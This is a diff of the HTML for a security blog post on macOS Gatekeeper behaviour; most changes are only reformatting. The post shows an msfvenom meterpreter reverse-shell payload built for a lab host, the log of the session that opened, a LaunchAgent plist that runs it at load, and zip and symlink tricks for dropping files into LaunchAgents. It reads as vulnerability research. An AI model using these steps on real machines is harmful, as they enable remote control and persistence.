@@ -53,7 +53,7 @@
     <link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-32x32.png" sizes="32x32">
     <link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-16x16.png" sizes="16x16">
 
-    <meta name="generator" content="Hugo 0.58.3" />
+    <meta name="generator" content="Hugo 0.71.0" />
   </head>
 
   <body class=" ">
@@ -126,39 +126,31 @@
       </header>
 
       <div>
-        
-
-<h2 id="tl-dr">TL;DR</h2>
-
+        <h2 id="tldr">TL;DR</h2>
 <p>On macOS Mojave Gatekeeper only verifies executables, which are run with the <code>open</code> command or the user double clicks. It won’t verify files, that are executed through other means like, directly executing a binary <code>./myapp</code> regardless of the quarantine attribute. If you can place a plist file inside LaunchAgents/LaunchDaemons, the command inside will also be executed. Prior to Catalina there is a way to trick users to drag &amp; drop files in the LaunchAgents folder.
 On macOS Catalina lot has changed, the most notable one regarding gatekeeper is that it will verify files when executed via classic ‘exec’ methods.</p>
-
 <h2 id="how-it-started">How it started?</h2>
-
 <p>When I did my research about embedding files in pkg files back in 2018, I had to verify if Gatekeeper will block my newly created unsigned PKG file or not. First I did a mistake at running it after packing, when I realised, that it’s not good as the file won’t have quarantine extended attribute and Gatekeeper will not check those. Then I downloaded it and instead of double clicking, I did:</p>
 <div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">chmod +x mypackage.pkg
-./mypackage.pkg </code></pre></div>
-<p>And it run. And I was like: WHAT?!?!?!  Why could I run an unsigned PKG file if it has a quarantine attribute? Obviously I didn’t really understood at this point how Gatekeeper works, but more on that later. So I started to experiment, and see how can I run unsigned code.</p>
-
+./mypackage.pkg 
+</code></pre></div><p>And it run. And I was like: WHAT?!?!?!  Why could I run an unsigned PKG file if it has a quarantine attribute? Obviously I didn’t really understood at this point how Gatekeeper works, but more on that later. So I started to experiment, and see how can I run unsigned code.</p>
 <h2 id="the-mojave-era">The Mojave era</h2>
-
 <h3 id="preparation">Preparation</h3>
-
 <p>I created a meterpreter in Kali linux for testing:</p>
-<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfvenom -p osx/x64/meterpreter_reverse_tcp <span style="color:#033">LHOST</span><span style="color:#555">=</span><span style="color:#f60">192</span>.168.120.132 <span style="color:#033">LPORT</span><span style="color:#555">=</span><span style="color:#f60">80</span> -f macho &gt; m
+<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfvenom -p osx/x64/meterpreter_reverse_tcp <span style="color:#033">LHOST</span><span style="color:#555">=</span>192.168.120.132 <span style="color:#033">LPORT</span><span style="color:#555">=</span><span style="color:#f60">80</span> -f macho &gt; m
 <span style="color:#555">[</span>-<span style="color:#555">]</span> No platform was selected, choosing Msf::Module::Platform::OSX from the payload
 <span style="color:#555">[</span>-<span style="color:#555">]</span> No arch selected, selecting arch: x64 from the payload
 No encoder or badchars specified, outputting raw payload
 Payload size: <span style="color:#f60">808168</span> bytes
-Final size of macho file: <span style="color:#f60">808168</span> bytes</code></pre></div>
-<p>Then I started a HTTP server to simulate the download, and downloaded it to my macOS:</p>
+Final size of macho file: <span style="color:#f60">808168</span> bytes
+</code></pre></div><p>Then I started a HTTP server to simulate the download, and downloaded it to my macOS:</p>
 <div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python -m SimpleHTTPServer <span style="color:#f60">8080</span>
-Serving HTTP on <span style="color:#f60">0</span>.0.0.0 port <span style="color:#f60">8080</span> ...
-<span style="color:#f60">192</span>.168.120.1 - - <span style="color:#555">[</span><span style="color:#f60">08</span>/Feb/2019 <span style="color:#f60">08</span>:27:12<span style="color:#555">]</span> <span style="color:#c30">&#34;GET / HTTP/1.1&#34;</span> <span style="color:#f60">200</span> -
-<span style="color:#f60">192</span>.168.120.1 - - <span style="color:#555">[</span><span style="color:#f60">08</span>/Feb/2019 <span style="color:#f60">08</span>:27:13<span style="color:#555">]</span> code <span style="color:#f60">404</span>, message File not found
-<span style="color:#f60">192</span>.168.120.1 - - <span style="color:#555">[</span><span style="color:#f60">08</span>/Feb/2019 <span style="color:#f60">08</span>:27:13<span style="color:#555">]</span> <span style="color:#c30">&#34;GET /favicon.ico HTTP/1.1&#34;</span> <span style="color:#f60">404</span> -
-<span style="color:#f60">192</span>.168.120.1 - - <span style="color:#555">[</span><span style="color:#f60">08</span>/Feb/2019 <span style="color:#f60">08</span>:27:15<span style="color:#555">]</span> <span style="color:#c30">&#34;GET /m HTTP/1.1&#34;</span> <span style="color:#f60">200</span> -</code></pre></div>
-<p>If I check the file’s extended attributes it looks right:</p>
+Serving HTTP on 0.0.0.0 port <span style="color:#f60">8080</span> ...
+192.168.120.1 - - <span style="color:#555">[</span>08/Feb/2019 08:27:12<span style="color:#555">]</span> <span style="color:#c30">&#34;GET / HTTP/1.1&#34;</span> <span style="color:#f60">200</span> -
+192.168.120.1 - - <span style="color:#555">[</span>08/Feb/2019 08:27:13<span style="color:#555">]</span> code 404, message File not found
+192.168.120.1 - - <span style="color:#555">[</span>08/Feb/2019 08:27:13<span style="color:#555">]</span> <span style="color:#c30">&#34;GET /favicon.ico HTTP/1.1&#34;</span> <span style="color:#f60">404</span> -
+192.168.120.1 - - <span style="color:#555">[</span>08/Feb/2019 08:27:15<span style="color:#555">]</span> <span style="color:#c30">&#34;GET /m HTTP/1.1&#34;</span> <span style="color:#f60">200</span> -
+</code></pre></div><p>If I check the file’s extended attributes it looks right:</p>
 <div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">xattr -l m
 com.apple.metadata:kMDItemWhereFroms:
 <span style="color:#f60">00000000</span>  <span style="color:#f60">62</span> <span style="color:#f60">70</span> 6C <span style="color:#f60">69</span> <span style="color:#f60">73</span> <span style="color:#f60">74</span> <span style="color:#f60">30</span> <span style="color:#f60">30</span> A2 <span style="color:#f60">01</span> <span style="color:#f60">02</span> 5F <span style="color:#f60">10</span> 1D <span style="color:#f60">68</span> <span style="color:#f60">74</span>  |bplist00…_..ht|
@@ -169,26 +161,20 @@ com.apple.metadata:kMDItemWhereFroms:
 <span style="color:#f60">00000050</span>  <span style="color:#f60">00</span> <span style="color:#f60">00</span> <span style="color:#f60">00</span> <span style="color:#f60">01</span> <span style="color:#f60">01</span> <span style="color:#f60">00</span> <span style="color:#f60">00</span> <span style="color:#f60">00</span> <span style="color:#f60">00</span> <span style="color:#f60">00</span> <span style="color:#f60">00</span> <span style="color:#f60">00</span> <span style="color:#f60">03</span> <span style="color:#f60">00</span> <span style="color:#f60">00</span> <span style="color:#f60">00</span>  |…………….|
 <span style="color:#f60">00000060</span>  <span style="color:#f60">00</span> <span style="color:#f60">00</span> <span style="color:#f60">00</span> <span style="color:#f60">00</span> <span style="color:#f60">00</span> <span style="color:#f60">00</span> <span style="color:#f60">00</span> <span style="color:#f60">00</span> <span style="color:#f60">00</span> <span style="color:#f60">00</span> <span style="color:#f60">00</span> <span style="color:#f60">00</span> 4A           |…………J|
 0000006d
-com.apple.quarantine: <span style="color:#f60">0081</span>;5c5d2f53;Chrome;4FFAAC3A-929D-45EB-ABEF-78B25C3CC15E</code></pre></div>
-<h3 id="experimenet-1">Experimenet #1</h3>
-
+com.apple.quarantine: 0081;5c5d2f53;Chrome;4FFAAC3A-929D-45EB-ABEF-78B25C3CC15E
+</code></pre></div><h3 id="experimenet-1">Experimenet #1</h3>
 <p>If I double click the file in Finder I get it blocked as expected:</p>
-
-<p><img src="https://theevilbit.github.io/images/GateKeeper_Bypass_or_not_bypass/Screenshot%202019-02-08%20at%208.46.06.png" alt="" /></p>
-
+<p><img src="https://theevilbit.github.io/images/GateKeeper_Bypass_or_not_bypass/Screenshot%202019-02-08%20at%208.46.06.png" alt=""></p>
 <p>If I try the <code>open</code> command it will be also blocked.</p>
-
 <h3 id="experiment-2">Experiment #2</h3>
-
 <p>But if I open Terminal, and set the file executable, I can run it without any issues:</p>
 <div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">chmod +x m
-./m</code></pre></div>
-<p>And I get my shell:</p>
+./m
+</code></pre></div><p>And I get my shell:</p>
 <div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf exploit<span style="color:#555">(</span>multi/handler<span style="color:#555">)</span> &gt; run
-<span style="color:#555">[</span>*<span style="color:#555">]</span> Started reverse TCP handler on <span style="color:#f60">192</span>.168.120.132:80 
-<span style="color:#555">[</span>*<span style="color:#555">]</span> Meterpreter session <span style="color:#f60">1</span> opened <span style="color:#555">(</span><span style="color:#f60">192</span>.168.120.132:80 -&gt; <span style="color:#f60">192</span>.168.120.1:53040<span style="color:#555">)</span> at <span style="color:#f60">2019</span>-02-08 <span style="color:#f60">08</span>:32:06 +0100</code></pre></div>
-<h3 id="experiment-3">Experiment #3</h3>
-
+<span style="color:#555">[</span>*<span style="color:#555">]</span> Started reverse TCP handler on 192.168.120.132:80 
+<span style="color:#555">[</span>*<span style="color:#555">]</span> Meterpreter session <span style="color:#f60">1</span> opened <span style="color:#555">(</span>192.168.120.132:80 -&gt; 192.168.120.1:53040<span style="color:#555">)</span> at 2019-02-08 08:32:06 +0100
+</code></pre></div><h3 id="experiment-3">Experiment #3</h3>
 <p>I create a launch plist file:</p>
 <div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#099">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
 <span style="color:#099">&lt;!DOCTYPE plist PUBLIC &#34;-//Apple//DTD PLIST 1.0//EN&#34; &#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;&gt;</span>
@@ -203,8 +189,8 @@ com.apple.quarantine: <span style="color:#f60">0081</span>;5c5d2f53;Chrome;4FFAA
        <span style="color:#309;font-weight:bold">&lt;key&gt;</span>RunAtLoad<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
     <span style="color:#309;font-weight:bold">&lt;true/&gt;</span>
 <span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
-<span style="color:#309;font-weight:bold">&lt;/plist&gt;</span></code></pre></div>
-<p>If you can’t mark it executable:</p>
+<span style="color:#309;font-weight:bold">&lt;/plist&gt;</span>
+</code></pre></div><p>If you can’t mark it executable:</p>
 <div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#099">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
 <span style="color:#099">&lt;!DOCTYPE plist PUBLIC &#34;-//Apple//DTD PLIST 1.0//EN&#34; &#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;&gt;</span>
 <span style="color:#309;font-weight:bold">&lt;plist</span> <span style="color:#309">version=</span><span style="color:#c30">&#34;1.0&#34;</span><span style="color:#309;font-weight:bold">&gt;</span>
@@ -220,26 +206,23 @@ com.apple.quarantine: <span style="color:#f60">0081</span>;5c5d2f53;Chrome;4FFAA
        <span style="color:#309;font-weight:bold">&lt;key&gt;</span>RunAtLoad<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
     <span style="color:#309;font-weight:bold">&lt;true/&gt;</span>
 <span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
-<span style="color:#309;font-weight:bold">&lt;/plist&gt;</span></code></pre></div>
-<p>And run:</p>
-<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">launchctl load test.plist</code></pre></div>
-<p>And I get my shell again.</p>
-
+<span style="color:#309;font-weight:bold">&lt;/plist&gt;</span>
+</code></pre></div><p>And run:</p>
+<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">launchctl load test.plist
+</code></pre></div><p>And I get my shell again.</p>
 <h3 id="experiment-4">Experiment #4</h3>
-
 <p>Make a C code to run a supplied program:</p>
 <div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#099">#include</span> <span style="color:#099">&lt;stdio.h&gt;</span><span style="color:#099">
 </span><span style="color:#099">#include</span> <span style="color:#099">&lt;stdlib.h&gt;</span><span style="color:#099">
 </span><span style="color:#099"></span>
 <span style="color:#078;font-weight:bold">int</span> <span style="color:#c0f">main</span>(<span style="color:#078;font-weight:bold">int</span> argc, <span style="color:#078;font-weight:bold">char</span><span style="color:#555">*</span> argv[]) {
     system(argv[<span style="color:#f60">1</span>]);
-}</code></pre></div><div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gcc hello.c -o h
-./h /Users/csaby/Downloads/m</code></pre></div>
-<h3 id="1-bonus-dyld-insert-libraries">+1 Bonus: DYLD_INSERT_LIBRARIES</h3>
-
+}
+</code></pre></div><div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gcc hello.c -o h
+./h /Users/csaby/Downloads/m
+</code></pre></div><h3 id="1-bonus-dyld_insert_libraries">+1 Bonus: DYLD_INSERT_LIBRARIES</h3>
 <p>You can inject quarantine flagged binaries in Mojave, which in fact is pretty much expected. See my older post about how to perform this injection:
 <a href="https://theevilbit.github.io/posts/dyld_insert_libraries_dylib_injection_in_macos_osx_deep_dive/">DYLD_INSERT_LIBRARIES DYLIB injection in macOS / OSX · theevilbit blog</a></p>
-
 <pre><code>$ ./test 
 Hello from dylib!
 
@@ -254,110 +237,83 @@ com.apple.metadata:kMDItemWhereFroms:
 00000060  00 00 00 00 00 00 00 00 00 00 00 49              |...........I|
 0000006c
 com.apple.quarantine: 0081;5d248e35;Chrome;CE4482F1-0AD8-4387-ABF6-C05A4443CAF4
-</code></pre>
-
-<h3 id="is-this-a-bypass-or-not">Is this a bypass or not?</h3>
-
+</code></pre><h3 id="is-this-a-bypass-or-not">Is this a bypass or not?</h3>
 <p>So at that point I wasn’t sure if this is a bypass or not, I was really confused. First I did a Google search about this, and no one talks about this as a Gatekeeper ‘bypass’, but it’s well known, to be able to execute files this way on macOS Mojave. Here are a few sites, that mention this:</p>
-
 <p><a href="https://apple.stackexchange.com/questions/262355/xxx-cant-be-opened-you-should-move-it-to-trash-for-flash-projector-applicat">macos - “XXX can’t be opened. You should move it to trash.” for flash projector applications on Mac os Sierra - Ask Different</a>
 <a href="https://github.com/bitcoin/bitcoin/issues/7085">Mac Gatekeeper security prompt every time · Issue #7085 · bitcoin/bitcoin · GitHub</a>
 <a href="https://objective-see.com/blog/blog_0x32.html">OSX.Dummy new Mac malware targets the cryptocurrency community</a></p>
-
 <p>It seemed that even Patrick Wardle is unsure if this counts or not (taken from the above post):</p>
-
-<p><img src="https://theevilbit.github.io/images/GateKeeper_Bypass_or_not_bypass/Screenshot%202019-04-03%20at%2011.02.47.png" alt="" /></p>
-
+<p><img src="https://theevilbit.github.io/images/GateKeeper_Bypass_or_not_bypass/Screenshot%202019-04-03%20at%2011.02.47.png" alt=""></p>
 <p>So I decided to ask Apple about this, they must know it for sure. I sent a report, and after a couple of weeks they decided that it’s normal behaviour.</p>
-
 <h3 id="what-is-gatekeeper-then">What is Gatekeeper then?</h3>
-
 <p>Probably the closest you can get to understand it is by watching Patrick’s talk from Shmoocon 2016: <a href="https://speakerdeck.com/patrickwardle/shmoocon-2016-gatekeeper-exposed-come-see-conquer">ShmooCon 2016 Gatekeeper Exposed; Come, See, Conquer - Speaker Deck</a>.  Watch it, read it, won’t repeat it here :)</p>
-
 <p>Although it’s not clearly stated everywhere, but I think the overall goal is prevent execution when users double-click applications downloaded from the Internet. If you go and grant execution rights, I think Apple assumes ‘advanced’ users in that case and will not deal with it. At least in Mojave. This is my take on it.</p>
-
 <h2 id="abusing-launchagents">Abusing LaunchAgents</h2>
-
 <p>Now if we go back there is one clear way to execute anything on a macOS, without the need to grant executable rights, and that is dropping a file the the user’s LaunchAgent directory. Anything you put inside, will be executed, you can use bash to do your magic, drop files, etc. So I started to experiment if I can drop there a file.</p>
-
-<h3 id="safari-s-auto-extract-feature">Safari’s auto extract feature</h3>
-
+<h3 id="safaris-auto-extract-feature">Safari’s auto extract feature</h3>
 <p>I think it’s a well known feature of Apple’s Safari browser, that by default it will auto-extract archives. IMO this is super unsafe and everyone should disable it.</p>
-
-<p><img src="https://theevilbit.github.io/images/GateKeeper_Bypass_or_not_bypass/Screenshot%202019-04-03%20at%2011.27.40.png" alt="" /></p>
-
+<p><img src="https://theevilbit.github.io/images/GateKeeper_Bypass_or_not_bypass/Screenshot%202019-04-03%20at%2011.27.40.png" alt=""></p>
 <p>I started to see if I can go ahead and drop a file to the LaunchAgent folder of the user, utilising this functionality. I didn’t want to modify any default setting, obviously pointing the location to LaunchAgent folder would solve this right away, but no one on Earth does that, so let’s just be realistic.</p>
-
-<h3 id="try-fail-1-use-relative-paths-in-zip">Try &amp; Fail 1 - use relative paths in ZIP</h3>
-
+<h3 id="try--fail-1---use-relative-paths-in-zip">Try &amp; Fail 1 - use relative paths in ZIP</h3>
 <p>In a ZIP file you can use relative paths, so my first thought was to use that. It failed, here is how I prepared the file, and then where it was dropped.</p>
-
 <p>Create test file, compress and cleanup.</p>
 <div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mac:Downloads csaby$ <span style="color:#366">echo</span> <span style="color:#366">test</span> &gt; ../Library/LaunchAgents/test.plist
 mac:Downloads csaby$ zip test.zip ../Library/LaunchAgents/test.plist 
-  adding: ../Library/LaunchAgents/test.plist <span style="color:#555">(</span>stored <span style="color:#f60">0</span>%<span style="color:#555">)</span>
+  adding: ../Library/LaunchAgents/test.plist <span style="color:#555">(</span>stored 0%<span style="color:#555">)</span>
 
-mac:Downloads csaby$ rm ../Library/LaunchAgents/test.plist </code></pre></div>
-<p>Download file, and check where it is dropped</p>
+mac:Downloads csaby$ rm ../Library/LaunchAgents/test.plist 
+</code></pre></div><p>Download file, and check where it is dropped</p>
 <div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mac:Downloads csaby$ ls ../Library/LaunchAgents/test.plist
 ls: ../Library/LaunchAgents/test.plist: No such file or directory
-mac:Downloads csaby$ ls Library/LaunchAgents/test.plist</code></pre></div>
-<p>Ok, it didn’t care about the traversal, my second thought was to use the tilde sign.</p>
-
+mac:Downloads csaby$ ls Library/LaunchAgents/test.plist
+</code></pre></div><p>Ok, it didn’t care about the traversal, my second thought was to use the tilde sign.</p>
 <p>Prepare and cleanup.</p>
 <div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mac:Downloads csaby$ <span style="color:#366">echo</span> <span style="color:#366">test</span> &gt; ../Library/LaunchAgents/test.plist
 mac:Downloads csaby$ rm test.zip 
 mac:Downloads csaby$ zip test.zip ~/Library/LaunchAgents/test.plist 
-  adding: Users/csaby/Library/LaunchAgents/test.plist <span style="color:#555">(</span>stored <span style="color:#f60">0</span>%<span style="color:#555">)</span>
-mac:Downloads csaby$ rm ../Library/LaunchAgents/test.plist </code></pre></div>
-<p>Download, and find it.</p>
+  adding: Users/csaby/Library/LaunchAgents/test.plist <span style="color:#555">(</span>stored 0%<span style="color:#555">)</span>
+mac:Downloads csaby$ rm ../Library/LaunchAgents/test.plist 
+</code></pre></div><p>Download, and find it.</p>
 <div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mac:Downloads csaby$ ls Library/LaunchAgents/test.plist
 ls: Library/LaunchAgents/test.plist: No such file or directory
 mac:Downloads csaby$ ls ~/Library/LaunchAgents/test.plist
-ls: /Users/csaby/Library/LaunchAgents/test.plist: No such file or directory</code></pre></div>
-<p>So where it is?</p>
+ls: /Users/csaby/Library/LaunchAgents/test.plist: No such file or directory
+</code></pre></div><p>So where it is?</p>
 <div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mac:Downloads csaby$ cat test.zip 
 PK
 G_?N?5?;+Users/csaby/Library/LaunchAgents/test.plistUT	???<span style="color:#c30;font-weight:bold">\΃</span>?<span style="color:#c30;font-weight:bold">\u</span>x
                                                                  ?test
 PK
 G_?N?5?;+??Users/csaby/Library/LaunchAgents/test.plistUT???<span style="color:#c30;font-weight:bold">\u</span>x
-                                                              ?PKqj</code></pre></div>
-<p>Looks like zip replaced the ~ with the actual path.</p>
+                                                              ?PKqj
+</code></pre></div><p>Looks like zip replaced the ~ with the actual path.</p>
 <div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mac:Downloads csaby$ ls Users/csaby/Library/LaunchAgents/test.plist 
-Users/csaby/Library/LaunchAgents/test.plist</code></pre></div>
-<p>Why that happens? If we look at the archive utility settings, which is used to extract files, we got this:</p>
-
-<p><img src="https://theevilbit.github.io/images/GateKeeper_Bypass_or_not_bypass/Screenshot%202019-04-03%20at%2012.03.48.png" alt="" /></p>
-
+Users/csaby/Library/LaunchAgents/test.plist
+</code></pre></div><p>Why that happens? If we look at the archive utility settings, which is used to extract files, we got this:</p>
+<p><img src="https://theevilbit.github.io/images/GateKeeper_Bypass_or_not_bypass/Screenshot%202019-04-03%20at%2012.03.48.png" alt=""></p>
 <p>So it seems, whatever we do, it will create the files there.</p>
-
-<h3 id="try-fail-2-symlink">Try &amp; Fail 2 - Symlink</h3>
-
+<h3 id="try--fail-2---symlink">Try &amp; Fail 2 - Symlink</h3>
 <p>Symlinks worked once, maybe they could work again. Let’s create a symlink, a test file, add it to a zip file, and cleanup:</p>
 <div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mac:Downloads csaby$ ln -s ../Library/LaunchAgents/ la
 mac:Downloads csaby$ <span style="color:#366">echo</span> <span style="color:#366">test</span> &gt; la/test.plist
 
 mac:Downloads csaby$ ls -l la
-lrwxr-xr-x  <span style="color:#f60">1</span> csaby  staff  <span style="color:#f60">24</span> Apr  <span style="color:#f60">4</span> <span style="color:#f60">09</span>:17 la -&gt; ../Library/LaunchAgents/
+lrwxr-xr-x  <span style="color:#f60">1</span> csaby  staff  <span style="color:#f60">24</span> Apr  <span style="color:#f60">4</span> 09:17 la -&gt; ../Library/LaunchAgents/
 
 mac:Downloads csaby$ zip -y test.zip la
-  adding: la <span style="color:#555">(</span>stored <span style="color:#f60">0</span>%<span style="color:#555">)</span>
+  adding: la <span style="color:#555">(</span>stored 0%<span style="color:#555">)</span>
 mac:Downloads csaby$ zip -y test.zip la/test.plist 
-  adding: la/test.plist <span style="color:#555">(</span>stored <span style="color:#f60">0</span>%<span style="color:#555">)</span>
+  adding: la/test.plist <span style="color:#555">(</span>stored 0%<span style="color:#555">)</span>
 
 mac:Downloads csaby$ rm la
-mac:Downloads csaby$ rm ../Library/LaunchAgents/test.plist </code></pre></div>
-<p>If we try to uncompress it know we get an error:</p>
-
-<p><img src="https://theevilbit.github.io/images/GateKeeper_Bypass_or_not_bypass/Screenshot%202019-04-04%20at%209.22.47.png" alt="" /></p>
-
+mac:Downloads csaby$ rm ../Library/LaunchAgents/test.plist 
+</code></pre></div><p>If we try to uncompress it know we get an error:</p>
+<p><img src="https://theevilbit.github.io/images/GateKeeper_Bypass_or_not_bypass/Screenshot%202019-04-04%20at%209.22.47.png" alt=""></p>
 <p>If we add just a symbolic link, it will be extracted, but anything inside that won’t be.</p>
-
 <p>If we unzip it with unzip it also works:</p>
 <div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mac:Downloads csaby$ ln -s ../Library/LaunchAgents/ la
 mac:Downloads csaby$ zip -y test.zip la
-  adding: la <span style="color:#555">(</span>stored <span style="color:#f60">0</span>%<span style="color:#555">)</span>
+  adding: la <span style="color:#555">(</span>stored 0%<span style="color:#555">)</span>
 mac:Downloads csaby$ ls la/
 com.google.keystone.agent.plist		com.google.keystone.xpcservice.plist	com.objectiveSee.blockblock.plist
 mac:Downloads csaby$ 
@@ -375,11 +331,11 @@ Archive:  test.zip
 finishing deferred symbolic links:
   la                     -&gt; ../Library/LaunchAgents/
 mac:Downloads csaby$ ls la
-com.google.keystone.agent.plist		com.google.keystone.xpcservice.plist	com.objectiveSee.blockblock.plist</code></pre></div>
-<p>Interestingly if we use the built in unzip command line utility it will follow symlinks when extracting:</p>
+com.google.keystone.agent.plist		com.google.keystone.xpcservice.plist	com.objectiveSee.blockblock.plist
+</code></pre></div><p>Interestingly if we use the built in unzip command line utility it will follow symlinks when extracting:</p>
 <div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mac:Downloads csaby$ <span style="color:#366">echo</span> <span style="color:#366">test</span> &gt; la/test.plist
 mac:Downloads csaby$ zip t.zip la/test.plist 
-  adding: la/test.plist <span style="color:#555">(</span>stored <span style="color:#f60">0</span>%<span style="color:#555">)</span>
+  adding: la/test.plist <span style="color:#555">(</span>stored 0%<span style="color:#555">)</span>
 mac:Downloads csaby$ cat t.zip 
 PK
 la/test.plistUT	??<span style="color:#c30;font-weight:bold">\$</span>??<span style="color:#c30;font-weight:bold">\u</span>x
@@ -395,62 +351,39 @@ Archive:  t.zip
  extracting: la/test.plist           
 
 mac:Downloads csaby$ ls la
-com.google.keystone.agent.plist		com.google.keystone.xpcservice.plist	com.objectiveSee.blockblock.plist	test.plist</code></pre></div>
-<p>However if we try to extract the above zip file with Archive Utility, it won’t follow symlinks, and will create a new folder:</p>
-<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mac:Downloads csaby$ ls la<span style="color:#c30;font-weight:bold">\ </span><span style="color:#f60">2</span>/
-test.plist</code></pre></div>
-<h3 id="try-fail-3-cpio-archives">Try &amp; Fail 3 - CPIO archives</h3>
-
+com.google.keystone.agent.plist		com.google.keystone.xpcservice.plist	com.objectiveSee.blockblock.plist	test.plist
+</code></pre></div><p>However if we try to extract the above zip file with Archive Utility, it won’t follow symlinks, and will create a new folder:</p>
+<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mac:Downloads csaby$ ls la<span style="color:#c30;font-weight:bold">\ </span>2/
+test.plist
+</code></pre></div><h3 id="try--fail-3---cpio-archives">Try &amp; Fail 3 - CPIO archives</h3>
 <p>Doesn’t make a difference. Here is how you create a CPIO archive:</p>
 <div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mac:Downloads csaby$ ls ../Library/LaunchAgents/test.plist | cpio -ov &gt; test.cpio
 ../Library/LaunchAgents/test.plist
 <span style="color:#f60">1</span> block
 
 mac:Downloads csaby$ cat test.cpio 
-<span style="color:#f60">0707077777770000011006440007650000240000010000001345133562600004300000000000</span>../Library/LaunchAgents/test.plist0707070000000000000000000000000000000000010000000000000000000001300000000000TRAILER!!!</code></pre></div>
-<p>Even if you update the path with tilde, everything will be created in the Downloads folder.</p>
-
-<p><img src="https://theevilbit.github.io/images/GateKeeper_Bypass_or_not_bypass/Screenshot%202019-04-04%20at%2010.16.30.png" alt="" /></p>
-
-<h3 id="try-fail-4-many-others">Try &amp; Fail 4 - Many Others</h3>
-
+0707077777770000011006440007650000240000010000001345133562600004300000000000../Library/LaunchAgents/test.plist0707070000000000000000000000000000000000010000000000000000000001300000000000TRAILER!!!
+</code></pre></div><p>Even if you update the path with tilde, everything will be created in the Downloads folder.</p>
+<p><img src="https://theevilbit.github.io/images/GateKeeper_Bypass_or_not_bypass/Screenshot%202019-04-04%20at%2010.16.30.png" alt=""></p>
+<h3 id="try--fail-4---many-others">Try &amp; Fail 4 - Many Others</h3>
 <p>Nothing new here, basically just various combination of the above and trying to insert <code>../</code> paths in the middle, but no success overall, but spending countless of hours trying :)</p>
-
 <p>In the meantime a Gatekeeper bypass came out that utilises symlinks, it’s a pretty neat idea, check it out here:</p>
-
 <p><a href="https://www.fcvl.net/vulnerabilities/macosx-gatekeeper-bypass">MacOS X GateKeeper Bypass</a></p>
-
 <p>It was created by Filippo Cavallarin. The TL;DR version is: a symlink that points to an NFS share (starting with <code>/net/</code>) will be auto mounted. Any file on a file share is not subject to Gatekeeper check, thus any file from there could be executed. You can deliver a symlink in a ZIP file as discussed above.</p>
-
 <h3 id="tricking-users">Tricking users</h3>
-
